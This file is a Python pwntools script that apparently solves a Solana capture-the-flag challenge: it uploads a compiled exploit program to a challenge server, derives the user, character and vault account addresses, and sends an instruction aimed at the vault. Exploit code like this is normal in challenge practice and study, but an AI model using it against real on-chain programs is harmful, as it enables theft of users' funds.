from pwn import *
from solana.publickey import PublicKey
from solana.system_program import SYS_PROGRAM_ID

host = args.HOST or "localhost"
port = int(args.PORT or 5000)
solve_so = "solve.so"

io = connect(host, port)

with open(solve_so, "rb") as f:
    solve_so_data = f.read()

io.sendlineafter(b"len", str(len(solve_so_data)).encode("ascii"))
io.send(solve_so_data)

io.recvuntil(b"program: ").decode("ascii")
program = PublicKey(io.recvline().strip().decode())
log.info(f"program: {program}")

io.recvuntil(b"user: ").decode("ascii")
user = PublicKey(io.recvline().strip().decode("ascii"))
log.info(f"user: {user}")

useraccount, useraccount_bump = PublicKey.find_program_address(
    [
        b"ACCOUNT",
        bytes(PublicKey(user)),
        b"f1x3r",
    ],
    program,
)
log.info(f"useraccount: {useraccount}")

character, character_bump = PublicKey.find_program_address(
    [
        b"CHARACTER",
        bytes(useraccount),
        int(0).to_bytes(1, "little")
    ],
    program,
)
log.info(f"character: {character}")

vault, vault_bump = PublicKey.find_program_address([b"VAULT"], program)
log.info(f"vault: {vault}")

accounts = [
    (b"ws", user.to_base58()),
    (b"q", program.to_base58()),
    (b"w", character.to_base58()),
    (b"w", useraccount.to_base58()),
    (b"w", vault.to_base58()),
    (b"q", SYS_PROGRAM_ID.to_base58()),
]

ix_data = p8(vault_bump)

io.recvuntil(b"num accounts:").decode("ascii")
io.sendline(str(len(accounts)).encode("ascii"))
for access, key in accounts:
    io.sendline(access + b" " + key)

io.recvuntil(b"ix len:").decode("ascii")
io.sendline(str(len(ix_data)).encode("ascii"))

io.send(ix_data)
output = printable(io.recvall()).decode("utf-8")
log.info(output)
